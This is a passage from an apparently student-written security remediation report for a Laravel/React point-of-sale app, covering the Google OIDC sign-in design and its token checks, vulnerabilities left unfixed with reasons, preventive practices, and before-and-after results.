[P00452 | 41940:41941 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00453 | 41941:41942 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00454 | 41942:41943 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00455 | 41943:41944 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00456 | 41944:41995 | NORMAL_TEXT]
The three one-time values, and why each is needed:

[P00457 | 41998:42004 | NORMAL_TEXT | TABLE row=0 col=0]
Value

[P00458 | 42005:42021 | NORMAL_TEXT | TABLE row=0 col=1]
Defends against

[P00459 | 42022:42026 | NORMAL_TEXT | TABLE row=0 col=2]
How

[P00460 | 42028:42034 | NORMAL_TEXT | TABLE row=1 col=0]
state

[P00461 | 42035:42059 | NORMAL_TEXT | TABLE row=1 col=1]
CSRF / session fixation

[P00462 | 42060:42268 | NORMAL_TEXT | TABLE row=1 col=2]
Ties the callback to a flow this server started, so an attacker cannot hand a victim a crafted callback URL and log them into the attacker's account — where everything the victim then does is visible to them

[P00463 | 42270:42276 | NORMAL_TEXT | TABLE row=2 col=0]
nonce

[P00464 | 42277:42290 | NORMAL_TEXT | TABLE row=2 col=1]
Token replay

[P00465 | 42291:42412 | NORMAL_TEXT | TABLE row=2 col=2]
Embedded in the ID token by Google and checked on return, so a token captured from one sign-in cannot be submitted again

[P00466 | 42414:42429 | NORMAL_TEXT | TABLE row=3 col=0]
code_ver ifier

[P00467 | 42430:42435 | NORMAL_TEXT | TABLE row=3 col=1]
Code

[P00468 | 42435:42448 | NORMAL_TEXT | TABLE row=3 col=1]
interception

[P00469 | 42449:42516 | NORMAL_TEXT | TABLE row=3 col=2]
Proves the party redeeming the code is the party that requested it

[P00470 | 42517:42860 | NORMAL_TEXT]
All three are held server-side in the cache and deleted when consumed, so a callback works at most once. The browser carries only the opaque state  which means an XSS in the SPA cannot steal anything that would let an attacker complete someone else's sign-in. Given this application had a stored XSS, that is not a hypothetical consideration.

[P00471 | 42860:42909 | HEADING_2]
6.4 ID token verification  eight explicit checks

[P00472 | 42909:43152 | NORMAL_TEXT]
Laravel Socialite would do the code exchange in one line, but it does not verify the ID token — it calls the userinfo endpoint instead. The verification is the security boundary, so GoogleOidcService::verifyIdToken performs it explicitly with

[P00473 | 43152:43171 | NORMAL_TEXT]
firebase/php-jwt :

[P00474 | 43174:43176 | NORMAL_TEXT | TABLE row=0 col=0]
#

[P00475 | 43177:43183 | NORMAL_TEXT | TABLE row=0 col=1]
Check

[P00476 | 43184:43199 | NORMAL_TEXT | TABLE row=0 col=2]
Why it matters

[P00477 | 43201:43203 | NORMAL_TEXT | TABLE row=1 col=0]
1

[P00478 | 43204:43217 | NORMAL_TEXT | TABLE row=1 col=1]
Signature vs

[P00479 | 43217:43231 | NORMAL_TEXT | TABLE row=1 col=1]
Google's JWKS

[P00480 | 43232:43284 | NORMAL_TEXT | TABLE row=1 col=2]
A JWT is just base64 until its signature is checked

[P00481 | 43286:43288 | NORMAL_TEXT | TABLE row=2 col=0]
2

[P00482 | 43289:43293 | NORMAL_TEXT | TABLE row=2 col=1]
iss

[P00483 | 43294:43342 | NORMAL_TEXT | TABLE row=2 col=2]
Confirms Google minted it, not another provider

[P00484 | 43344:43346 | NORMAL_TEXT | TABLE row=3 col=0]
3

[P00485 | 43347:43367 | NORMAL_TEXT | TABLE row=3 col=1]
aud = our client id

[P00486 | 43368:43549 | NORMAL_TEXT | TABLE row=3 col=2]
Without this, a token legitimately issued to any other Google OAuth client replays here with a perfectly valid signature. The most commonly omitted check in hand-written OIDC code.

[P00487 | 43551:43553 | NORMAL_TEXT | TABLE row=4 col=0]
4

[P00488 | 43554:43564 | NORMAL_TEXT | TABLE row=4 col=1]
exp / iat

[P00489 | 43565:43603 | NORMAL_TEXT | TABLE row=4 col=2]
60s skew; future-dated tokens refused

[P00490 | 43605:43607 | NORMAL_TEXT | TABLE row=5 col=0]
5

[P00491 | 43608:43614 | NORMAL_TEXT | TABLE row=5 col=1]
nonce

[P00492 | 43615:43653 | NORMAL_TEXT | TABLE row=5 col=2]
hash_equals against this flow's value

[P00493 | 43655:43657 | NORMAL_TEXT | TABLE row=6 col=0]
6

[P00494 | 43658:43672 | NORMAL_TEXT | TABLE row=6 col=1]
email present

[P00495 | 43673:43711 | NORMAL_TEXT | TABLE row=6 col=2]
It is what we match a staff record on

[P00496 | 43713:43715 | NORMAL_TEXT | TABLE row=7 col=0]
7

[P00497 | 43716:43731 | NORMAL_TEXT | TABLE row=7 col=1]
email_verified

[P00498 | 43732:43813 | NORMAL_TEXT | TABLE row=7 col=2]
On a consumer account an unverified address proves nothing about who controls it

[P00499 | 43815:43817 | NORMAL_TEXT | TABLE row=8 col=0]
8

[P00500 | 43818:43821 | NORMAL_TEXT | TABLE row=8 col=1]
hd

[P00501 | 43822:43978 | NORMAL_TEXT | TABLE row=8 col=2]
Enforced on the claim, not the request parameter — that parameter is only a hint to Google's account chooser and the user can simply delete it from the URL

[P00502 | 43979:44232 | NORMAL_TEXT]
The JWKS is cached for an hour because Google rotates those keys; a hard-coded copy would break sign-in at the next rotation. A fetch failure does not fall back to a stale key set failing sign-in beats verifying against keys that may have been revoked.

[P00503 | 44232:44257 | HEADING_2]
6.5 No auto-provisioning

[P00504 | 44257:44434 | NORMAL_TEXT]
A Google account with no matching staff record is refused with 403. Creating one automatically would recreate V-01 with extra steps: anyone with a Google account could sign up.

[P00505 | 44434:44632 | NORMAL_TEXT]
Google answers "who is this person". It has no opinion on whether they work here, and none at all on whether they are an administrator. Role, department and is_active are never read from the token.

[P00506 | 44632:44926 | NORMAL_TEXT]
Matching is on google_id (the OIDC sub ) first, then email. The subject is the stable identifier; an email address can be changed, or in a Workspace domain reassigned to a different person entirely  matching on address alone would hand the previous holder's POS account to whoever inherits it.

[P00507 | 44926:44927 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00508 | 44927:44944 | HEADING_2]
6.6 Verification

[P00509 | 44944:44946 | NORMAL_TEXT]
[INLINE_OBJECT d.177]

[P00510 | 44946:44947 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00511 | 44947:44985 | HEADING_1]
7. Vulnerabilities not fixed, and why

[P00512 | 44985:44986 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00513 | 44986:45078 | NORMAL_TEXT]
The assignment asks for these explicitly. Each was considered a decision, not an oversight.

[P00514 | 45078:45310 | NORMAL_TEXT]
NF-1 · Encryption of customer PII at rest. The customers table stores names, addresses, phone numbers and NIC numbers in plain text. Laravel's encrypted cast would protect them against a database-file compromise or a stolen backup.

[P00515 | 45310:45788 | NORMAL_TEXT]
Why not: an encrypted column cannot be indexed or LIKE -searched, and customer search by name and phone is the single most-used feature on the till. Doing it properly needs blind indexing (a searchable HMAC of the normalized value alongside the ciphertext), which is a data-migration and query-rewrite project across six controllers. Mitigated: the paths that expose this data are now authenticated, role-gated and department-scoped (V-01/V-02/V-03), and reading it is audited.

[P00516 | 45788:45944 | NORMAL_TEXT]
NF-2 · httpOnly; SameSite=Strict cookie instead of a bearer token. A cookie script cannot read at all is strictly better than any token the page can reach.

[P00517 | 45944:46389 | NORMAL_TEXT]
Why not: it requires Sanctum's stateful SPA mode and a shared parent domain, and this app is deployed cross-origin  Vercel frontend, shared-host API. Changing that is a deployment-topology decision, not a code change. Mitigated: per-tab in-memory storage instead of localStorage , 8-hour server-side expiry, role-scoped abilities, XSS removed at source (V13), and a strict CSP (V-18). The residual window is one tab-session rather than forever.

[P00518 | 46389:46465 | NORMAL_TEXT]
NF-3 · MFA / TOTP for administrators. The highest value remains in control.

[P00519 | 46465:46823 | NORMAL_TEXT]
Why not: it needs a secret store, enrolment UI, recovery codes and a lockout-recovery procedure for a shop with no IT desk a feature in its own right, beyond these assignments timebox. Partially mitigated: an administrator signing in with Google is protected by that account's 2FA, so the OIDC work delivers most of the benefit for the strongest login path.

[P00520 | 46823:47067 | NORMAL_TEXT]
NF-4 · Supply-chain surface reduction. The frontend ships two complete UI kits (shadcn/Radix and Ant Design), two toast libraries, and a non-standard rolldown-vite build channel that will not receive the same security backports as stable Vite.

[P00521 | 47067:47388 | NORMAL_TEXT]
Why not: removing a UI library means touching every page that imports from it, and a visual regression pass across 24 pages that we cannot properly test without the shop's own data. The dependency count is a real risk; breaking the till is a certain one. Mitigated: all 23 advisories cleared, and npm audit now gates CI.

[P00522 | 47388:47582 | NORMAL_TEXT]
NF-5 · Rotating leaked values and rewriting history. The production and staging hostnames remain in the frontend's git history, and the live document root still points at the project directory.

[P00523 | 47582:47924 | NORMAL_TEXT]
Why not: rewriting history with git filter-repo changes every commit hash and breaks every existing clone and it would also destroy the before/after history this assignment is graded on. The complete remediation is to rotate the hostnames and move the document root, both of which need DNS and hosting-panel access the team does not control.

[P00524 | 47924:48094 | NORMAL_TEXT]
Mitigated: .htaccess hardened to deny dotfiles, source directories and logs; .gitignore fixed; CI now fails on any tracked .env ; a runbook is included for the operator.

[P00525 | 48094:48160 | NORMAL_TEXT]
NF-6 · ~126 pre-existing lint errors. Almost all no-unused-vars .

[P00526 | 48160:48504 | NORMAL_TEXT]
Why not: none are security defects, and clearing them would touch dozens of files this remediation has no other reason to change  burying the security diff and making it unreviewable. Mitigated: the security rules got their own config and their own CI gate ( lint:security ), which passes clean. The cleanup can be scheduled on its own merits.

[P00527 | 48504:48549 | HEADING_1]
8. Practices that would have prevented these

[P00528 | 48549:48550 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00529 | 48550:48677 | NORMAL_TEXT]
The most useful question is not "what was wrong" but "what would have caught it". Several findings point at the same few gaps.

[P00530 | 48677:48729 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Authorization asserted by tests, not by intention. 

[P00531 | 48729:49202 | NORMAL_TEXT]
V-02 is the sharpest lesson in this report: the control was designed, implemented and registered, then not connected and nothing noticed for months. No scanner catches this, because a scanner cannot know which routes ought to be privileged. A single test per privileged route ( assert an employee gets 403 ) would have failed on day one. We wrote 22 such tests; they are cheap and they are the only thing that makes "who can call this?" a question with an enforced answer.

[P00532 | 49202:49247 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Secure defaults over remembered discipline. 

[P00533 | 49247:49443 | NORMAL_TEXT]
V-04 recurred in five controllers because $request->all() is easier to type than $request->validated() . V-03 recurred in thirteen places because a plain find($id) is the obvious thing to write. 

[P00534 | 49443:49686 | NORMAL_TEXT]
The fix in both cases was to make the wrong thing impossible rather than merely discouraged: business keys removed from $fillable so mass assignment cannot reach them; ->visibleTo() as the idiom with unscoped queries visible by their absence.

[P00535 | 49686:49737 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Lint rules where the framework's protection ends. 

[P00536 | 49737:49738 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00537 | 49738:50022 | NORMAL_TEXT]
V-13 happened because the team's mental model  "React escapes for us"  was correct for 23 of 24 pages and wrong for the one building HTML by hand. A rule banning document.write and innerHTML would have flagged it the day it was written. And the rule must be tested: our first attempt

[P00538 | 50022:50177 | NORMAL_TEXT]
used the obvious no-restricted-properties form, which silently matched none of the seven real call sites because they are all printWindow.document.write .

[P00539 | 50177:50218 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Dependency scanning in CI from day one. 

[P00540 | 50218:50308 | NORMAL_TEXT]
V-12's 41 advisories did not appear overnight; they accumulated while nobody was looking.

[P00541 | 50308:50478 | NORMAL_TEXT]
Composer audit and npm audit take seconds and would have surfaced Laravel 10's end of life the week it happened, when upgrading was a small job rather than a forced one.

[P00542 | 50478:50527 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Make the insecure default impossible to commit. 

[P00543 | 50527:50583 | NORMAL_TEXT]
V-14's root cause was not a careless commit it was that

[P00544 | 50583:50733 | NORMAL_TEXT]
.gitignore had no .env rule, so nothing prevented it and nothing warned. Our CI asserts the rule exists, not just that the file is currently absent. 

[P00545 | 50733:50734 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00546 | 50734:50735 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00547 | 50735:50770 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
One error contract, defined once. 

[P00548 | 50770:51012 | NORMAL_TEXT]
V-07 leaked SQL from ten call sites while GrnController gated the same thing correctly. Per-controller error handling means every controller is an opportunity to get it wrong. A single Handler::render() means an individual controller cannot.

[P00549 | 51012:51058 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Threat-model the client boundary explicitly. 

[P00550 | 51058:51280 | NORMAL_TEXT]
V-10 and V-16 are the same mistake at two layers: treating the SPA as part of the system rather than as an untrusted client. Asking "what if this request did not come from our UI?" of each endpoint would have caught both.

[P00551 | 51280:51323 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Log security events before you need them. 

[P00552 | 51323:51517 | NORMAL_TEXT]
V-11 meant the 20-attempt password spray in V-05b left no trace at all, and invoice cancellation actively erased its own evidence. Logging is cheap before an incident and impossible afterwards.

[P00553 | 51517:51567 | NORMAL_TEXT | LIST id=kix.list.6 level=0]
Reproducible provisioning as a security control. 

[P00554 | 51567:51785 | NORMAL_TEXT]
Three defects (§5) meant the application could not be installed from source. An operator whose only option is to hand-patch the schema will diverge from the intended configuration which is how misconfiguration starts.

[P00555 | 51785:51796 | HEADING_1]
9. Results

[P00556 | 51796:51797 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00557 | 51800:51808 | NORMAL_TEXT | TABLE row=0 col=0]
Measure

[P00558 | 51809:51816 | NORMAL_TEXT | TABLE row=0 col=1]
Before

[P00559 | 51817:51823 | NORMAL_TEXT | TABLE row=0 col=2]
After

[P00560 | 51825:51851 | NORMAL_TEXT | TABLE row=1 col=0]
Attack scripts succeeding

[P00561 | 51852:51900 | NORMAL_TEXT | TABLE row=1 col=1]
12 / 12 core suite + V-20 separate reproduction

[P00562 | 51901:51908 | NORMAL_TEXT | TABLE row=1 col=2]
0 / 14

[P00563 | 51910:51930 | NORMAL_TEXT | TABLE row=2 col=0]
Composer advisories

[P00564 | 51931:51934 | NORMAL_TEXT | TABLE row=2 col=1]
41

[P00565 | 51935:51937 | NORMAL_TEXT | TABLE row=2 col=2]
0

[P00566 | 51939:51954 | NORMAL_TEXT | TABLE row=3 col=0]
npm advisories

[P00567 | 51955:51980 | NORMAL_TEXT | TABLE row=3 col=1]
23 (2 critical, 14 high)

[P00568 | 51981:51983 | NORMAL_TEXT | TABLE row=3 col=2]
0

[P00569 | 51985:52008 | NORMAL_TEXT | TABLE row=4 col=0]
Backend security tests

[P00570 | 52009:52011 | NORMAL_TEXT | TABLE row=4 col=1]
0

[P00571 | 52012:52032 | NORMAL_TEXT | TABLE row=4 col=2]
90 (230 assertions)

[P00572 | 52034:52058 | NORMAL_TEXT | TABLE row=5 col=0]
Frontend security tests

[P00573 | 52059:52061 | NORMAL_TEXT | TABLE row=5 col=1]
0

[P00574 | 52062:52065 | NORMAL_TEXT | TABLE row=5 col=2]
19

[P00575 | 52067:52086 | NORMAL_TEXT | TABLE row=6 col=0]
Security lint gate

[P00576 | 52087:52092 | NORMAL_TEXT | TABLE row=6 col=1]
none

[P00577 | 52093:52099 | NORMAL_TEXT | TABLE row=6 col=2]
clean

[P00578 | 52101:52111 | NORMAL_TEXT | TABLE row=7 col=0]
Framework

[P00579 | 52112:52132 | NORMAL_TEXT | TABLE row=7 col=1]
Laravel 10.50 (EOL)

[P00580 | 52133:52149 | NORMAL_TEXT | TABLE row=7 col=2]
Laravel 12.69.2

[P00581 | 52151:52166 | NORMAL_TEXT | TABLE row=8 col=0]
Token lifetime

[P00582 | 52167:52177 | NORMAL_TEXT | TABLE row=8 col=1]
unlimited

[P00583 | 52178:52186 | NORMAL_TEXT | TABLE row=8 col=2]
8 hours

[P00584 | 52188:52212 | NORMAL_TEXT | TABLE row=9 col=0]
Audited security events

[P00585 | 52213:52215 | NORMAL_TEXT | TABLE row=9 col=1]
0

[P00586 | 52216:52231 | NORMAL_TEXT | TABLE row=9 col=2]
14 event types

[P00587 | 52232:52233 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00588 | 52233:52234 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00589 | 52234:52235 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00590 | 52235:52518 | NORMAL_TEXT]
Commit history: The GitHub evidence below records four contributors, 11 branches and 30 commits in the reporting-period snapshot. The Insights view shows 0 files changed on main in that snapshot; the contributor branches preserve the individual work used for review and integration.

[P00591 | 52518:52520 | NORMAL_TEXT]
[INLINE_OBJECT i.4]

[P00592 | 52520:52626 | NORMAL_TEXT]
Figure 1. GitHub repository overview showing the SSD_Assigment project and its security evidence folders.

[P00593 | 52626:52629 | NORMAL_TEXT]
[INLINE_OBJECT i.5][INLINE_OBJECT i.6]

[P00594 | 52629:52763 | NORMAL_TEXT]
Figures 2 and 3. GitHub branch list and Insights summary showing the contributor branches, four authors and recorded commit activity.

[P00595 | 52763:52764 | HEADING_1]
⟦EMPTY PARAGRAPH⟧

[P00596 | 52764:52765 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00597 | 52765:52766 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00598 | 52766:52767 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧


